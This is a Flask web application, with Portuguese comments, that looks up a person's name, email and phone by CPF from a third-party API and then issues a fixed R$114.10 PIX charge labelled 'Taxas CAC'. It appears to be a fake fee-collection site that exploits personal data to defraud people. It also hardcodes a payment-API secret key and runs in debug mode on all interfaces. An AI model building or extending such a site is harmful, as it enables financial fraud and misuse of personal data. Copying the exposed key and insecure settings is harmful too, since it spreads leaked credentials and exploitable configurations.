from flask import Flask, render_template, url_for, request, redirect, flash, session, jsonify
import os
import requests
import logging
from datetime import datetime, timedelta
import time
from typing import Dict, Any, Optional

# Configuração do logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "a secret key")
app.static_folder = 'static'

# URL da API do Portal CAC
CAC_API_URL = "https://portal-cac.org/api_clientes.php?cpf={cpf}"

# Configurações de timeout e retry
TIMEOUT = 30  # segundos
MAX_RETRIES = 3
RETRY_DELAY = 1  # segundos

class For4PaymentsAPI:
    API_URL = "https://app.for4payments.com.br/api/v1"

    def __init__(self, secret_key: str):
        self.secret_key = secret_key

    def _get_headers(self) -> Dict[str, str]:
        return {
            'Authorization': self.secret_key,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }

    def create_pix_payment(self, data: Dict[str, Any]) -> Dict[str, Any]:
        try:
            # Format and validate amount
            amount_in_cents = int(float(data['amount']) * 100)

            payment_data = {
                "name": data['name'],
                "email": data['email'],
                "cpf": ''.join(filter(str.isdigit, data['cpf'])),
                "phone": data.get('phone', ''),
                "paymentMethod": "PIX",
                "amount": amount_in_cents,
                "items": [{
                    "title": "Taxas CAC",
                    "quantity": 1,
                    "unitPrice": amount_in_cents,
                    "tangible": False
                }]
            }

            response = requests.post(
                f"{self.API_URL}/transaction.purchase",
                json=payment_data,
                headers=self._get_headers(),
                timeout=30
            )

            if response.status_code == 200:
                response_data = response.json()
                return {
                    'id': response_data.get('id'),
                    'pixCode': response_data.get('pixCode'),
                    'pixQrCode': response_data.get('pixQrCode'),
                    'expiresAt': response_data.get('expiresAt'),
                    'status': response_data.get('status', 'pending')
                }
            else:
                logger.error(f"Erro na API de pagamento: {response.text}")
                raise ValueError("Erro ao processar pagamento")

        except Exception as e:
            logger.error(f"Erro ao criar pagamento: {str(e)}")
            raise

    def check_payment_status(self, payment_id: str) -> Dict[str, Any]:
        """Check the status of a payment"""
        try:
            response = requests.get(
                f"{self.API_URL}/transaction.getPayment",
                params={'id': payment_id},
                headers=self._get_headers(),
                timeout=30
            )

            logger.info(f"Payment status check response: {response.status_code}")
            logger.debug(f"Payment status response body: {response.text}")

            if response.status_code == 200:
                payment_data = response.json()
                # Map For4Payments status to our application status
                status_mapping = {
                    'PENDING': 'pending',
                    'PROCESSING': 'pending',
                    'APPROVED': 'completed',
                    'COMPLETED': 'completed',
                    'PAID': 'completed',
                    'EXPIRED': 'failed',
                    'FAILED': 'failed',
                    'CANCELED': 'cancelled',
                    'CANCELLED': 'cancelled'
                }

                current_status = payment_data.get('status', 'PENDING')
                mapped_status = status_mapping.get(current_status, 'pending')

                logger.info(f"Payment {payment_id} status: {current_status} -> {mapped_status}")

                return {
                    'status': mapped_status,
                    'pix_qr_code': payment_data.get('pixQrCode'),
                    'pix_code': payment_data.get('pixCode')
                }
            elif response.status_code == 404:
                logger.warning(f"Payment {payment_id} not found")
                return {'status': 'pending'}
            else:
                error_message = f"Failed to fetch payment status (Status: {response.status_code})"
                logger.error(error_message)
                return {'status': 'pending'}

        except Exception as e:
            logger.error(f"Error checking payment status: {str(e)}")
            return {'status': 'pending'}


def create_payment_api() -> For4PaymentsAPI:
    secret_key = os.environ.get("FOR4PAYMENTS_SECRET_KEY", "7e0f69db-7b2d-4166-b8c5-fceed89b67c6")
    return For4PaymentsAPI(secret_key)

@app.route('/')
def index():
    return render_template('index.html', current_year=datetime.now().year)

@app.route('/consultar_cpf', methods=['POST'])
def consultar_cpf():
    cpf = request.form.get('cpf', '').strip()
    cpf_numerico = ''.join(filter(str.isdigit, cpf))

    if not cpf_numerico or len(cpf_numerico) != 11:
        flash('CPF inválido. Por favor, digite um CPF válido.')
        return redirect(url_for('index'))

    retry_count = 0
    while retry_count < MAX_RETRIES:
        try:
            response = requests.get(
                CAC_API_URL.format(cpf=cpf_numerico),
                timeout=TIMEOUT,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                }
            )
            response.raise_for_status()

            dados = response.json()
            if dados and all(key in dados for key in ['name', 'cpf', 'email', 'phone']):
                # Armazena os dados na sessão para uso posterior
                session['user_data'] = dados
                return render_template('dados_usuario.html', 
                                    dados=dados,
                                    current_year=datetime.now().year)
            else:
                flash('CPF não encontrado ou dados incompletos.')
                return redirect(url_for('index'))

        except requests.RequestException as e:
            logger.error(f"Erro ao consultar API do Portal CAC: {e}")
            if retry_count < MAX_RETRIES - 1:
                retry_count += 1
                time.sleep(RETRY_DELAY)
                continue
            flash('Ocorreu um erro ao consultar os dados. Por favor, tente novamente mais tarde.')
            return redirect(url_for('index'))

        except ValueError as e:
            logger.error(f"Erro ao processar resposta da API: {e}")
            flash('Erro ao processar os dados do CPF. Por favor, tente novamente.')
            return redirect(url_for('index'))

@app.route('/pagamento', methods=['GET', 'POST'])
def pagamento():
    user_data = session.get('user_data')
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    try:
        payment_api = create_payment_api()
        payment_data = {
            'name': user_data['name'],
            'email': user_data['email'],
            'cpf': user_data['cpf'],
            'phone': user_data['phone'],
            'amount': 114.10  # Valor fixo para todas as categorias
        }

        pix_data = payment_api.create_pix_payment(payment_data)
        return render_template('pagamento.html',
                           pix_data=pix_data,
                           valor_total="114,10",
                           current_year=datetime.now().year)

    except Exception as e:
        logger.error(f"Erro ao gerar pagamento: {e}")
        flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
        return redirect(url_for('index'))

@app.route('/check_payment/<payment_id>')
def check_payment(payment_id):
    try:
        payment_api = create_payment_api()
        status_data = payment_api.check_payment_status(payment_id)
        return jsonify(status_data)
    except Exception as e:
        logger.error(f"Error checking payment status: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/obrigado')
def obrigado():
    user_data = session.get('user_data')
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))
    return render_template('obrigado.html', 
                         current_year=datetime.now().year,
                         user_data=user_data)

@app.route('/categoria/<tipo>')
def categoria(tipo):
    user_data = session.get('user_data')
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))
    return render_template(f'categoria_{tipo}.html', 
                         current_year=datetime.now().year,
                         user_data=user_data)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)